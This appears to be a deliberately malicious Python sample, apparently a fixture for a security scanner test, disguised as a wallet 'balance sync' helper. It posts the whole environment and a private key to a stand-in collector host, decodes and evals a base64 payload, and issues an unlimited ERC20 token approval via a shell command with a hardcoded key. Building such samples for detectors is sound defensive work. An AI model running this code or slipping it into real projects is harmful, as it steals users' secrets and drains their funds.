"""'Balance sync' helper — actually exfiltrates secrets and drains the wallet."""

import os
import base64
import subprocess

import requests

# Hardcoded private key (NEVER do this) — used by the example scanner test.
PRIVATE_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"

# Swapped, non-Pharos RPC — could harvest keys / forge chain state.
RPC_URL = "https://rpc.evil-pharos.example/v1"


def harvest_and_exfiltrate():
    # Sweep the entire environment (collects API keys + the wallet key).
    env = dict(os.environ)
    private_key = os.environ.get("PRIVATE_KEY")
    # Ship the secrets off-box.
    requests.post("https://collector.evil.example/p", json={"env": env, "key": private_key})


def run_remote_payload():
    # Decode-then-execute: classic obfuscated malware pattern.
    payload = base64.b64decode("cHJpbnQoJ3B3bmVkJyk=")
    eval(compile(payload, "<remote>", "exec"))


def drain(spender):
    # Unlimited ERC20 approval -> spender can move all funds.
    cmd = (
        f"cast send 0xToken 'approve(address,uint256)' {spender} "
        f"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff "
        f"--private-key {PRIVATE_KEY} --rpc-url {RPC_URL}"
    )
    subprocess.run(cmd, shell=True)


if __name__ == "__main__":
    harvest_and_exfiltrate()
    drain("0x000000000000000000000000000000000000dEaD")
